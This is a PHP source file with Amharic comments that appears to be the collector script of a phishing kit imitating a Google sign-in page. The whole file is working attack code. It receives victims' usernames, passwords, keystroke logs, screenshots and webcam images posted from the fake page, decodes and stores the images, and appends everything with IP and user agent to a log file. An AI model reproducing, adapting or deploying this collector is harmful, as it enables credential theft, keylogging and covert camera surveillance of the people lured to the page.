<?php
// ስህተቶችን ለማሳየት (በምርት ላይ ሲሆን ማጥፋት ይመከራል)
// ini_set('display_errors', 1);
// ini_set('display_startup_errors', 1);
// error_reporting(E_ALL);

// የፋይል ዱካዎች አሁን ወደ "collected_data" ማውጫ ይጠቁማሉ
// collector.php ከ templates/google/ ውስጥ ስለሚሰራ, ወደ ዋናው phish_site/ ለመድረስ ../../ ያስፈልጋል
$baseDataDir = '../../collected_data/'; 
$logFile = $baseDataDir . 'logs.txt';
$screenshotDir = $baseDataDir . 'screenshots/';
$cameraImageDir = $baseDataDir . 'camera_images/';

// የ IP አድራሻ እና የተጠቃሚ ወኪል ማግኘት
$ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';

// የcollected_data ማውጫ መኖሩን ማረጋገጥ
if (!is_dir($baseDataDir)) {
    mkdir($baseDataDir, 0777, true); // 0777 ለጊዜያዊ ሙከራ፣ በምርት ላይ ደህንነቱ የተጠበቀ ፈቃድ (ለምሳሌ 0755) ተጠቀም
}

// የስክሪንሾት እና የካሜራ ምስሎች ማውጫዎች መኖራቸውን ማረጋገጥ
// ከሌሉ ይፈጥራቸዋል።
if (!is_dir($screenshotDir)) {
    mkdir($screenshotDir, 0777, true);
}
if (!is_dir($cameraImageDir)) {
    mkdir($cameraImageDir, 0777, true);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // የሎግ ይዘት ማዘጋጀት
    $logEntry = "========================================\n";
    $logEntry .= "Time: " . date('Y-m-d H:i:s') . "\n";
    $logEntry .= "IP: $ip\n";
    $logEntry .= "User Agent: $userAgent\n";
    $logEntry .= "----------------------------------------\n";

    // የኢሜል/መለያ ስም መሰብሰብ
    $username = $_POST['identifier'] ?? $_POST['email'] ?? $_POST['username'] ?? '';
    // የይለፍ ቃል መሰብሰብ
    $password = $_POST['password'] ?? '';
    // የኪይሎግ ዳታ መሰብሰብ
    $keys = $_POST['keys'] ?? '';
    // የስክሪንሾት ዳታ መሰብሰብ
    $screenshotData = $_POST['screenshot'] ?? '';
    // የካሜራ ምስል ዳታ መሰብሰብ
    $cameraImageData = $_POST['camera_image'] ?? '';
    // የካሜራ ስህተት መልእክት መሰብሰብ (ከJS የመጣ)
    $cameraError = $_POST['error'] ?? '';


    // ዳታዎችን ወደ ሎግ ማከል
    if (!empty($username)) $logEntry .= "Identifier/Email: $username\n";
    if (!empty($password)) $logEntry .= "Password: $password\n";
    if (!empty($keys)) $logEntry .= "Keylogs: " . $keys . "\n";
    if (!empty($cameraError)) $logEntry .= "Camera Access Error: " . $cameraError . "\n";


    // የስክሪንሾት ዳታ ካለ ማስቀመጥ
    if (!empty($screenshotData)) {
        // Base64 ዳታውን አፅዳ እና ዲኮድ አድርግ
        $base64Image = str_replace('data:image/png;base64,', '', $screenshotData);
        $base64Image = str_replace(' ', '+', $base64Image); // አንዳንድ ጊዜ የቦታ ቁምፊዎች በ + ይተካሉ
        $imageData = base64_decode($base64Image);

        if ($imageData !== false) {
            $screenshotFileName = $screenshotDir . time() . '_' . uniqid() . '.png';
            file_put_contents($screenshotFileName, $imageData);
            $logEntry .= "Screenshot saved to: " . basename($screenshotFileName) . " in $screenshotDir\n"; // ሎግ ላይ የሚታየውን ዱካ ማሳጠር
        } else {
            $logEntry .= "Failed to decode screenshot data.\n";
        }
    }

    // የካሜራ ምስል ዳታ ካለ ማስቀመጥ
    if (!empty($cameraImageData)) {
        // Base64 ዳታውን አፅዳ እና ዲኮድ አድርግ
        $base64Image = str_replace('data:image/png;base64,', '', $cameraImageData);
        $base64Image = str_replace(' ', '+', $base64Image); // አንዳንድ ጊዜ የቦታ ቁምፊዎች በ + ይተካሉ
        $imageData = base64_decode($base64Image);

        if ($imageData !== false) {
            $cameraImageFileName = $cameraImageDir . time() . '_' . uniqid() . '.png';
            file_put_contents($cameraImageFileName, $imageData);
            $logEntry .= "Camera image saved to: " . basename($cameraImageFileName) . " in $cameraImageDir\n"; // ሎግ ላይ የሚታየውን ዱካ ማሳጠር
        } else {
            $logEntry .= "Failed to decode camera image data.\n";
        }
    }

    $logEntry .= "========================================\n\n"; // ለንባብ ቀላል እንዲሆን የሚለያይ መስመር

    // መረጃውን ወደ ሎግ ፋይል መፃፍ
    file_put_contents($logFile, $logEntry, FILE_APPEND);

    // ወደ ጃቫስክሪፕት ቀላል ምላሽ መላክ
    echo json_encode(['status' => 'success', 'message' => 'Data received and logged.']);
    exit();

} else {
    // POST ያልሆነ ጥያቄ ከመጣ (ለምሳሌ በቀጥታ አሳሹ ውስጥ URL ሲከፈት)
    header('HTTP/1.1 405 Method Not Allowed');
    echo json_encode(['status' => 'error', 'message' => 'Only POST requests are allowed.']);
    exit();
}
?>
